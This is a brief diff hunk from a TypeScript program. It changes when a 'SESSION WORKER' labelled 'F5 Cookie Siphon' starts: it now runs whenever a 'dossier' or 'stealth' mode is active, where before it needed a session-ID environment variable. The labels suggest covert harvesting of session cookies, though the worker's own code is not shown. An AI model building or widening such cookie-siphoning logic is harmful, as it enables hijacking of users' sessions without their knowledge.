@@ -81,8 +81,8 @@ async function main(): Promise<void> {
     }
   } catch { /* Convex inaccessible — fallback normal */ }
 
-  // ─── SESSION WORKER (F5 Cookie Siphon) : lancer si CEV_SESSION_ID est défini
-  if (process.env.CEV_SESSION_ID) {
+  // ─── SESSION WORKER (F5 Cookie Siphon) : lancer si mode CEV actif
+  if (cevDossierMode || cevStealthMode) {
     startSessionWorker().catch(err => {
       console.error("[SESSION-WORKER] Crash fatal:", err);
     });
